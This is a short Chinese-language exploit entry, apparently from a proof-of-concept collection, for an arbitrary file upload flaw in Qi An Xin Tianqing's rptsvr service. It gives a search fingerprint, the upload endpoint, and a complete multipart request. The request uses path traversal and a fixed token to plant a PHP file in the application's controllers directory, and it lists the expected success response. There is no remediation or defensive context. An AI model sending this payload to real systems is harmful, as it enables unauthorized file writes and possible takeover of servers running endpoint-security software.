# 奇安信天擎rptsvr任意文件上传漏洞

- **系统**：奇安信天擎rptsvr　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`"QiAnXin web server"`
- **请求**：`POST /rptsvr/upload HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data;boundary=---------------------------s3kw…`

**请求体 / payload**
```
-----------------------------s3kwcmxrul2yyogjptcd
Content-Disposition: form-data; name="uploadfile"; filename="../../../application/api/controllers/dudesite.php"
Content-Type: text/x-python
dudesite
-----------------------------s3kwcmxrul2yyogjptcd
Content-Disposition: form-data; name="token"
skylar_report
-----------------------------s3kwcmxrul2yyogjptcd
```
- **预期**：200　|　success